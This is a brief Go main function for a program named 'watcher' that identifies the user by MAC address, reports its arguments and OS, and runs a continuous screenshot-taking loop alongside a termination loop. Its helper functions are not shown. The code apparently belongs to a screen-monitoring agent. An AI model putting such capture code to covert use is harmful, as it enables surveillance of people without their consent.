package main

import (
	"os"
	"runtime"
)

func main() {

	userName := identifyUserByMAC()

	if len(os.Args) == 2 {
		param := os.Args[1]
		_ = sendFakeShot(userName, "first param in watcher is "+param)
	} else {
		_ = sendFakeShot(userName, "len of args not 2")
	}

	sendFakeShot(userName, "hello from watcher ver 0.1.0 "+runtime.GOOS)
	go screenshotingLoop(userName)
	go terminationLoop(userName)
	select {}
}
